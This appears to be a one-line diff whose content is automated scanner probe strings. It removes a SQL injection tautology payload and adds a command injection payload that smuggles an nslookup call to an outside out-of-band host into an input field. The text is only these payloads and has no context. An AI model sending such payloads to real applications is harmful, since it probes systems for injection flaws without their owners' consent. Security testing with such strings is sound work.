@@ -1,1 +1,1 @@
--1' OR 2+175-175-1=0+0+0+1 or 'QDCxVB3Q'='
+&nslookup -q=cname hitqfxuvcwspk06347.bxss.me&'\"`0&nslookup -q=cname hitqfxuvcwspk06347.bxss.me&`'
